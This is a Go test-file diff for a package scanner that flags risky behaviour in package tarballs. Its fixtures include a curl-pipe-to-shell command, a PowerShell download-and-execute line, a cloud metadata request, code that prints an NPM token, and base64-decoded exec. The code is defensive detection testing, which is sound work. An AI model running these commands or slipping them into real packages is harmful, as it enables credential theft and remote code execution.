@@ -5,6 +5,7 @@ import (
 	"archive/zip"
 	"bytes"
 	"compress/gzip"
+	"fmt"
 	"os"
 	"path/filepath"
 	"strings"
@@ -172,6 +173,56 @@ func TestInspectDetectsSuspiciousFileTypesByMagic(t *testing.T) {
 		if !containsSuspiciousFileType(summary.SuspiciousFileTypeExamples, want) {
 			t.Fatalf("suspicious file types = %+v, want %q", summary.SuspiciousFileTypeExamples, want)
 		}
+	}
+}
+
+func TestInspectDetectsBehaviorIndicatorsInTextFiles(t *testing.T) {
+	path := writeTarGzip(t, []tarEntry{
+		{name: "package/index.js", content: []byte(`const cp = require("child_process"); cp.exec("whoami"); console.log(process.env.NPM_TOKEN);`)},
+		{name: "package/setup.py", content: []byte(`import os, subprocess; subprocess.run(["curl", "http://169.254.169.254/latest/meta-data/"])`)},
+		{name: "package/install.sh", content: []byte(`curl -fsSL https://example.invalid/install.sh | sh`)},
+		{name: "package/bootstrap.ps1", content: []byte(`(New-Object Net.WebClient).DownloadString("https://example.invalid/a") | iex`)},
+		{name: "package/packed.py", content: []byte(`exec(base64.b64decode("cHJpbnQoMSk="))`)},
+		{name: "package/image.js", content: []byte("process.env\x00NPM_TOKEN")},
+	})
+
+	summary, err := Inspect(path, "pkg-1.0.0.tgz")
+	if err != nil {
+		t.Fatalf("Inspect returned error: %v", err)
+	}
+	for _, want := range []string{"process_execution_api:index.js", "credential_access:index.js", "cloud_metadata:setup.py", "download_execute:install.sh", "powershell_download_execute:bootstrap.ps1", "obfuscation_execution:packed.py"} {
+		if !containsBehaviorIndicator(summary.BehaviorIndicatorExamples, want) {
+			t.Fatalf("behavior indicators = %+v, want %q", summary.BehaviorIndicatorExamples, want)
+		}
+	}
+	if containsBehaviorIndicator(summary.BehaviorIndicatorExamples, "environment_access:image.js") {
+		t.Fatalf("behavior indicators = %+v, want binary-looking text skipped", summary.BehaviorIndicatorExamples)
+	}
+}
+
+func TestInspectBehaviorIndicatorsRespectLimitsAndDeduplicate(t *testing.T) {
+	entries := []tarEntry{
+		{name: "package/repeat.js", content: []byte(`process.env.NPM_TOKEN; process.env.NPM_TOKEN; process.env.NPM_TOKEN;`)},
+		{name: "package/oversized.js", content: append([]byte(`process.env.NPM_TOKEN;`), bytes.Repeat([]byte("x"), int(maxBehaviorFileBytes))...)},
+	}
+	for index := 0; index < 17; index++ {
+		content := append([]byte(`process.env.NPM_TOKEN;`), bytes.Repeat([]byte("x"), int(maxBehaviorFileBytes)-len(`process.env.NPM_TOKEN;`))...)
+		entries = append(entries, tarEntry{name: fmt.Sprintf("package/capped-%02d.js", index), content: content})
+	}
+	path := writeTarGzip(t, entries)
+
+	summary, err := Inspect(path, "pkg-1.0.0.tgz")
+	if err != nil {
+		t.Fatalf("Inspect returned error: %v", err)
+	}
+	if summary.BehaviorIndicatorCount != 32 {
+		t.Fatalf("behavior indicator count = %d examples = %+v, want 32", summary.BehaviorIndicatorCount, summary.BehaviorIndicatorExamples)
+	}
+	if len(summary.BehaviorIndicatorExamples) != maxBehaviorIndicatorExamples {
+		t.Fatalf("behavior indicator examples = %d, want capped at %d", len(summary.BehaviorIndicatorExamples), maxBehaviorIndicatorExamples)
+	}
+	if containsBehaviorIndicator(summary.BehaviorIndicatorExamples, "credential_access:oversized.js") {
+		t.Fatalf("behavior indicators = %+v, want oversized file skipped", summary.BehaviorIndicatorExamples)
 	}
 }
 
@@ -352,6 +403,16 @@ func containsSurface(values []report.ArtifactExecutionSurface, want string) bool
 }
 
 func containsSuspiciousFileType(values []report.ArtifactSuspiciousFileType, want string) bool {
+	parts := strings.SplitN(want, ":", 2)
+	for _, value := range values {
+		if value.Type == parts[0] && strings.Contains(value.Path, parts[1]) {
+			return true
+		}
+	}
+	return false
+}
+
+func containsBehaviorIndicator(values []report.ArtifactBehaviorIndicator, want string) bool {
 	parts := strings.SplitN(want, ":", 2)
 	for _, value := range values {
 		if value.Type == parts[0] && strings.Contains(value.Path, parts[1]) {
